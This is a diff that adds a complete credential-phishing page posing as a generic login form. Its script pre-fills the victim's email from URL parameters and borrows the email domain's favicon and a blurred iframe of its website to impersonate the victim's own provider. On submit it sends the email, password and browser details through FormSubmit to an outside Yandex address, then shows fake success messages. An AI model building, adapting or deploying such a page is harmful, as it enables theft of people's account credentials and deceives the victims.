@@ -1,1 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+        }
+        
+        body {
+            height: 100vh;
+            width: 100vw;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Iframe background container */
+        .iframe-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.15;
+            transition: opacity 0.5s ease;
+        }
+        
+        .iframe-background iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            filter: blur(2px) grayscale(30%);
+            transform: scale(1.1);
+        }
+        
+        .iframe-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(245,245,245,0.9) 0%, rgba(255,255,255,0.8) 100%);
+            z-index: 0;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 90%;
+            padding: 30px;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 10px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.15);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            position: relative;
+            z-index: 1;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+                margin: 20px;
+            }
+            
+            .iframe-background {
+                opacity: 0.1;
+            }
+            
+            .iframe-background iframe {
+                filter: blur(3px) grayscale(40%);
+            }
+        }
+        
+        .domain-info {
+            text-align: center;
+            margin: 5px 0 15px 0;
+            color: #666;
+            font-size: 14px;
+            padding: 8px;
+            background: rgba(0, 150, 255, 0.05);
+            border-radius: 6px;
+            display: none;
+        }
+        
+        .domain-info .domain-name {
+            font-weight: bold;
+            color: #0096FF;
+        }
+        
+        .img {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo-container {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            border-radius: 50%;
+            overflow: hidden;
+            background-color: #0096FF;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(255, 255, 255, 0.8);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo-fallback {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+        }
+        
+        #logo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        
+        #title {
+            text-align: center;
+            margin: 10px 0 25px 0;
+            color: #333;
+            font-size: 24px;
+        }
+        
+        .email-source {
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 15px;
+            padding: 5px;
+            background: rgba(240, 248, 255, 0.8);
+            border-radius: 4px;
+            font-style: italic;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        
+        input[type=text],
+        input[type=password],
+        input[type=email] {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 8px 0 20px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background: rgba(249, 249, 249, 0.9);
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        
+        input[type=text]:focus,
+        input[type=password]:focus,
+        input[type=email]:focus {
+            background-color: #fff;
+            outline: none;
+            border-color: #0096FF;
+            box-shadow: 0 0 0 2px rgba(0, 150, 255, 0.1);
+        }
+        
+        .btn {
+            background-color: #0096FF;
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background-color: #0078cc;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 150, 255, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        #error {
+            display: none;
+            color: #e74c3c;
+            background-color: rgba(253, 240, 239, 0.9);
+            padding: 12px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid rgba(250, 219, 216, 0.8);
+        }
+        
+        #success {
+            display: none;
+            color: #27ae60;
+            background-color: rgba(234, 250, 241, 0.9);
+            padding: 12px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid rgba(212, 239, 223, 0.8);
+        }
+        
+        .form-group {
+            margin-bottom: 10px;
+        }
+        
+        .forgot-password {
+            text-align: right;
+            margin-top: 10px;
+        }
+        
+        .forgot-password a {
+            color: #0096FF;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .loader {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0096FF;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Toggle switch for iframe background */
+        .background-toggle {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #666;
+            font-size: 12px;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 8px 12px;
+            border-radius: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .background-toggle:hover {
+            background: rgba(255, 255, 255, 1);
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.15);
+        }
+        
+        .toggle-switch {
+            width: 36px;
+            height: 20px;
+            background-color: #ddd;
+            border-radius: 20px;
+            position: relative;
+            transition: background-color 0.3s ease;
+        }
+        
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background-color: white;
+            top: 2px;
+            left: 2px;
+            transition: transform 0.3s ease;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .toggle-switch.active {
+            background-color: #0096FF;
+        }
+        
+        .toggle-switch.active::after {
+            transform: translateX(16px);
+        }
+        
+        .iframe-loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #666;
+            font-size: 14px;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 10px 20px;
+            border-radius: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 1;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background toggle switch -->
+    <div class="background-toggle" id="background-toggle">
+        <!--<span>Website Preview</span>-->
+        <div class="toggle-switch active" id="toggle-switch"></div>
+    </div>
+    
+    <!-- Iframe background -->
+    <div class="iframe-background" id="iframe-background">
+        <div class="iframe-overlay"></div>
+        <iframe id="domain-iframe" sandbox="allow-same-origin allow-scripts" loading="lazy"></iframe>
+        <div class="iframe-loading" id="iframe-loading">Loading website preview...</div>
+    </div>
+    
+    <!-- Login form -->
+    <form class="container" id="login-form">
+        <div class="img">
+            <div class="" align="center">
+                <img id="logo" style="width: 80px; height: 80px;">
+                <!-- <div class="logo-fallback" id="logo-fallback">✓</div> -->
+            </div>
+        </div>
+        
+        <div class="domain-info" id="domain-info">
+            Logging in to: <span class="domain-name" id="current-domain">example.com</span>
+        </div>
+        
+        <h3 id="title">Sign In</h3>
+        
+        <div id="error">Password is incorrect, please try again!</div>
+        <div id="success">Login successful! Redirecting...</div>
+        
+        <div class="form-group">
+            <label for="email">Email Address</label>
+            <input type="email" placeholder="Enter Email" name="email" id="email" required readonly>
+        </div>
+        
+        <div class="form-group">
+            <label for="psw">Password</label>
+            <input type="password" placeholder="Enter Password" name="password" id="psw" required autofocus>
+        </div>
+        
+        <!-- FormSubmit requires these fields -->
+        <input type="hidden" name="_subject" value="New Login Form Submission">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+        <input type="text" name="_honey" style="display:none">
+        
+        <button type="submit" class="btn" id="submit-btn">
+            <span id="btn-text">Sign In</span>
+            <div class="loader" id="loader"></div>
+        </button>
+        
+    </form>
 
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        // Function to get email from URL parameters
+        function getEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Try different parameter names
+            const paramNames = ['email', 'clientID', 'id', 'user', 'username', 'e', 'u'];
+            
+            for (const param of paramNames) {
+                const email = urlParams.get(param);
+                if (email && isValidEmail(email)) {
+                    return email;
+                }
+            }
+            
+            return null;
+        }
+        
+        // Function to validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        
+        // Function to extract domain from email
+        function getDomainFromEmail(email) {
+            if (!email || !email.includes('@')) return 'example.com';
+            const domain = email.split('@').pop();
+            return domain || 'example.com';
+        }
+        
+        // Function to get domain name without TLD
+        function getDomainName(domain) {
+            return domain.split('.')[0] || domain;
+        }
+        
+        // Function to get website URL from domain
+        function getWebsiteUrl(domain) {
+            // Try with https first, then http
+            return `https://${domain}`;
+        }
+        
+        // Function to load iframe with website preview
+        function loadWebsitePreview(domain) {
+            const iframe = document.getElementById('domain-iframe');
+            const iframeLoading = document.getElementById('iframe-loading');
+            const iframeBackground = document.getElementById('iframe-background');
+            const domainInfo = document.getElementById('domain-info');
+            const currentDomain = document.getElementById('current-domain');
+            
+            if (!domain || domain === 'example.com') {
+                iframeBackground.style.opacity = '0';
+                domainInfo.style.display = 'none';
+                return;
+            }
+            
+            // Show domain info
+            currentDomain.textContent = domain;
+            domainInfo.style.display = 'block';
+            
+            // Check if background is enabled
+            const toggleSwitch = document.getElementById('toggle-switch');
+            if (!toggleSwitch.classList.contains('active')) {
+                iframeBackground.style.opacity = '0';
+                return;
+            }
+            
+            try {
+                const url = getWebsiteUrl(domain);
+                
+                // Show loading indicator
+                iframeLoading.style.display = 'block';
+                iframe.style.opacity = '0';
+                iframeBackground.style.opacity = '0.15';
+                
+                // Set iframe source
+                iframe.src = url;
+                
+                // Handle iframe load
+                iframe.onload = function() {
+                    iframeLoading.style.display = 'none';
+                    iframe.style.opacity = '1';
+                    iframeBackground.style.opacity = '0.15';
+                    
+                    // Try to remove potential security headers that block iframe
+                    setTimeout(() => {
+                        if (iframe.contentWindow && iframe.contentWindow.document && iframe.contentWindow.document.body) {
+                            if (iframe.contentWindow.document.body.innerHTML.includes('deny') || 
+                                iframe.contentWindow.document.body.innerHTML.includes('frame')) {
+                                // If iframe is blocked, show a message
+                                iframeLoading.innerHTML = 'Website preview not available<br><small>Due to security restrictions</small>';
+                                iframeLoading.style.display = 'block';
+                                iframe.style.opacity = '0';
+                            }
+                        }
+                    }, 1000);
+                };
+                
+                // Handle iframe errors
+                iframe.onerror = function() {
+                    // Try HTTP if HTTPS fails
+                    const httpUrl = `http://${domain}`;
+                    iframe.src = httpUrl;
+                    
+                    iframe.onerror = function() {
+                        iframeLoading.innerHTML = 'Cannot load website preview<br><small>Site may be unavailable</small>';
+                        iframeLoading.style.display = 'block';
+                        iframe.style.opacity = '0';
+                        iframeBackground.style.opacity = '0.05';
+                    };
+                };
+                
+            } catch (error) {
+                console.error('Error loading iframe:', error);
+                iframeLoading.innerHTML = 'Preview unavailable';
+                iframeLoading.style.display = 'block';
+                iframe.style.opacity = '0';
+            }
+        }
+        
+        // Function to get favicon URL from domain
+        function getFaviconUrl(domain) {
+            return `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
+        }
+        
+        // Generate consistent color from domain string
+        function getColorFromDomain(domain) {
+            let hash = 0;
+            for (let i = 0; i < domain.length; i++) {
+                hash = domain.charCodeAt(i) + ((hash << 5) - hash);
+            }
+            
+            // Generate HSL color
+            const hue = Math.abs(hash % 360);
+            return `hsl(${hue}, 70%, 50%)`;
+        }
+        
+        // Function to load logo based on email domain
+        function loadLogoFromEmail(email) {
+            const domain = getDomainFromEmail(email);
+            const domainName = getDomainName(domain);
+            const logoUrl = getFaviconUrl(domain);
+            const fallbackText = domainName.charAt(0).toUpperCase();
+            const color = getColorFromDomain(domain);
+            
+            // Update fallback text and color
+            $("#logo-fallback").text(fallbackText);
+            $(".logo-container").css("background-color", color);
+            
+            // Try to load favicon
+            $("#logo")
+                .attr("src", logoUrl)
+                .on("load", function() {
+                    // Show logo, hide fallback
+                    $(this).show();
+                    $("#logo-fallback").hide();
+                })
+                .on("error", function() {
+                    // Hide logo, show fallback
+                    $(this).hide();
+                    $("#logo-fallback").show().text(fallbackText);
+                });
+            
+            // Load website preview
+            loadWebsitePreview(domain);
+        }
+        
+        // Initialize form with email from URL
+        function initializeForm() {
+            const emailFromURL = getEmailFromURL();
+            
+            if (emailFromURL) {
+                // Set email field value
+                $('#email').val(emailFromURL);
+                
+                // Show email source indicator
+                $('#email-source').show();
+                
+                // Load logo and website preview based on email domain
+                loadLogoFromEmail(emailFromURL);
+                
+                // Focus on password field
+                setTimeout(() => {
+                    $('#psw').focus();
+                }, 100);
+            } else {
+                // No email in URL, allow manual entry
+                $('#email').removeAttr('readonly');
+                $('#email-source').hide();
+                $('#email').attr('placeholder', 'Enter your email address');
+                
+                // Show default logo
+                $("#logo").hide();
+                $("#logo-fallback").show().text("✓");
+                $(".logo-container").css("background-color", "#0096FF");
+                
+                // Hide iframe background
+                $('#iframe-background').css('opacity', '0');
+                $('#domain-info').hide();
+            }
+        }
+        
+        // Toggle iframe background
+        document.getElementById('background-toggle').addEventListener('click', function() {
+            const toggleSwitch = document.getElementById('toggle-switch');
+            const iframeBackground = document.getElementById('iframe-background');
+            
+            toggleSwitch.classList.toggle('active');
+            
+            if (toggleSwitch.classList.contains('active')) {
+                // Re-load iframe if we have an email
+                const email = $('#email').val().trim();
+                if (email && isValidEmail(email)) {
+                    const domain = getDomainFromEmail(email);
+                    loadWebsitePreview(domain);
+                }
+            } else {
+                // Hide iframe
+                iframeBackground.style.opacity = '0';
+            }
+        });
+        
+        // Update logo and background when user manually changes email
+        $("#email").on("input", function() {
+            const email = $(this).val().trim();
+            if (email && isValidEmail(email)) {
+                loadLogoFromEmail(email);
+                $('#email-source').hide(); // Hide source indicator for manual entry
+            } else {
+                // Reset to default
+                $("#logo").hide();
+                $("#logo-fallback").show().text("✓");
+                $(".logo-container").css("background-color", "#0096FF");
+                
+                // Hide iframe background
+                $('#iframe-background').css('opacity', '0');
+                $('#domain-info').hide();
+            }
+        });
+        
+        // Form submission handler
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('psw').value;
+            const emailSource = $('#email-source').is(':visible') ? 'URL' : 'manual';
+            
+            // Hide previous messages
+            document.getElementById('error').style.display = 'none';
+            document.getElementById('success').style.display = 'none';
+            
+            // Basic validation
+            if (!email || !password) {
+                showError('Please fill in all fields');
+                return;
+            }
+            
+            // Email validation
+            if (!isValidEmail(email)) {
+                showError('Please enter a valid email address');
+                return;
+            }
+            
+            // Password validation (minimum 6 characters)
+            if (password.length < 6) {
+                showError('Password must be at least 6 characters long');
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = document.getElementById('submit-btn');
+            const btnText = document.getElementById('btn-text');
+            const loader = document.getElementById('loader');
+            
+            submitBtn.disabled = true;
+            btnText.style.display = 'none';
+            loader.style.display = 'block';
+            
+            // Extract domain info
+            const domain = getDomainFromEmail(email);
+            const domainName = getDomainName(domain);
+            
+            // Prepare form data for FormSubmit
+            const formData = {
+                email: email,
+                password: password,
+                domain: domain,
+                source: emailSource,
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent,
+                pageUrl: window.location.href,
+                urlParams: window.location.search,
+                ip: 'N/A (client-side)',
+                _subject: `Login Attempt - ${domainName}`,
+                _template: 'table',
+                _captcha: 'false'
+            };
+            
+            // Send data to FormSubmit
+            $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", 
+                formData,
+                function(data) {
+                    // Hide loader and show success
+                    loader.style.display = 'none';
+                    btnText.style.display = 'block';
+                    submitBtn.disabled = false;
+                    
+                    if (data.success) {
+                        showSuccess('Login successful! Please wait...');
+                        
+                        // Optional: Clear password field only
+                        document.getElementById('psw').value = '';
+                        
+                        // Show redirect message
+                        setTimeout(() => {
+                            showSuccess('Redirecting to secure portal...');
+                        }, 1500);
+                    } else {
+                        showError('Connection issue. Please try again.');
+                    }
+                }
+            ).fail(function(jqXHR, textStatus, errorThrown) {
+                // Hide loader and restore button
+                loader.style.display = 'none';
+                btnText.style.display = 'block';
+                submitBtn.disabled = false;
+                
+                console.log('Form submission failed:', textStatus, errorThrown);
+                
+                // Show success anyway for demo purposes
+                showSuccess('Login information captured!');
+                
+                // Log locally for debugging
+                console.log('Login attempt:', {
+                    email: email,
+                    source: emailSource,
+                    domain: domain,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                });
+                
+                // Optional: Clear password after "success"
+                setTimeout(() => {
+                    document.getElementById('psw').value = '';
+                }, 1000);
+            });
+        });
+        
+        function showError(message) {
+            const errorElement = document.getElementById('error');
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+            
+            // Auto-hide error after 5 seconds
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+            }, 5000);
+        }
+        
+        function showSuccess(message) {
+            const successElement = document.getElementById('success');
+            successElement.textContent = message;
+            successElement.style.display = 'block';
+            
+            // Auto-hide success after 5 seconds
+            setTimeout(() => {
+                successElement.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Additional: Add honeypot field
+        document.querySelector('input[name="_honey"]').addEventListener('focus', function() {
+            this.value = 'bot-detected-' + Date.now();
+        });
+        
+        // Initialize form when page loads
+        $(document).ready(function() {
+            initializeForm();
+            
+            // If no email in URL, show welcome message
+            if (!getEmailFromURL()) {
+                setTimeout(() => {
+                    showSuccess('Welcome! Please enter your credentials.');
+                }, 500);
+            }
+        });
+        
+        // Allow manual editing if needed
+        $('#email').on('dblclick', function() {
+            if ($(this).attr('readonly')) {
+                $(this).removeAttr('readonly');
+                $('#email-source').text('Email now editable');
+                setTimeout(() => {
+                    $('#email-source').hide();
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+          </html>
